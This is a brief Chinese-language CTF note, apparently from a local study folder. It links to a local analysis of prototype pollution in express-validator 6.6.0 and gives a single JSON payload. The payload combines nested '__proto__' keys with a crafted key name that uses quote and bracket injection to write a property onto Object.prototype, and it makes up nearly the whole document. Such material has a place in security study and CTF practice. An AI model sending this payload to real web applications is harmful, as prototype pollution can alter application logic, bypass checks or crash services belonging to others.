## 文章

[express-validator 6.6.0 原型链污染分析](F:\LocalCTF\express-validator 6.6.0 原型链污染分析.html)

## Payload

```json
{"a": {"__proto__": {"test": "testvalue"}}, "a\"].__proto__[\"test": 222}
```

